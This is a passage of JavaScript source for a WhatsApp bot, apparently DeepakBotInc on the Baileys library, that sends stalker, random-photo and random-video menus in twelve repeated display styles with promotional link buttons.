                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stalkermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomphotomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomvideomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
